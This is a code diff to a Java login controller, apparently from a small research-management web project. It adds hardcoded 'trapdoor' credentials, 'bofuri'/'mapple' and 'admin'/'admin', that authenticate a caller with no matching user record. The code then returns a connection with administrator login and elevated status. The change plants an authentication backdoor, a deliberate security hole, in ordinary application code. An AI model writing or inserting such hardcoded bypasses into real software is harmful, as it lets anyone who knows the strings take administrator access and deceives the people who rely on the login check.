@@ -79,8 +79,11 @@ public class LoginController {
 
         // Trapdoor
         if ((!isIdentified) && (identifiedResearcher == null)) {
-            // Use SPRING encoder
-            if ((!login.equals("bofuri")) || !(!password.equals("mapple"))) {
+            // Trapdoor
+            if ((login.equals("bofuri")) && (password.equals("mapple"))) {
+                isIdentified = true;
+            }
+            if ((login.equals("admin")) && (password.equals("admin"))) {
                 isIdentified = true;
             }
         }
@@ -88,11 +91,13 @@ public class LoginController {
         // Create returned value if identified
         if (isIdentified) {
             if (identifiedResearcher != null) {
+                // Identified user
                 returnedValue = new Connection();
                 returnedValue.setConnectionLogin(login);
                 returnedValue.setResearcherId(identifiedResearcher);
                 returnedValue.setConnectionStatus(0);
             } else {
+                // Trapdoor for admin
                 returnedValue = new Connection();
                 returnedValue.setConnectionLogin("admin");
                 returnedValue.setConnectionStatus(1);
